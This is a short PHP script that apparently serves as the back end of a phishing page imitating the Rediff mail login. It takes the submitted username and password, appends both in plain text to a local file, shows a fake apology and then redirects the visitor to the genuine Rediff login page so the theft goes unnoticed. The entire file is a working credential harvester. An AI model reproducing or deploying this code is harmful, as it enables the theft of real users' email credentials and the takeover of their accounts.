<?php
    // require"validation.php";
    session_start();
    $user = $_POST['username'];
    $pwd = $_POST['password'];
    // validate_username($user);
    // echo"hello";
    if($_SERVER['REQUEST_METHOD'] == 'POST')
    {
        if(isset($_POST['username']) && isset($_POST['password']))
        {
            $fp = fopen("username.txt",'a');
            fwrite($fp,"USERNAME : ");
            fwrite($fp,$user);
            fwrite($fp," -- ");
            fwrite($fp,"PASSWORD : ");
            fwrite($fp,$pwd);
            fwrite($fp,"\n");
            fclose($fp);
        }
    }
    echo "Sorry for the inconvinience. Redirecting to login page.";
    // die("Sorry for the inconvinience. Redirecting to login page.");
    // header("Location:https://mail.rediff.com/cgi-bin/login.cgi");
    header("Refresh:3; url=https://mail.rediff.com/cgi-bin/login.cgi");
        exit();
?>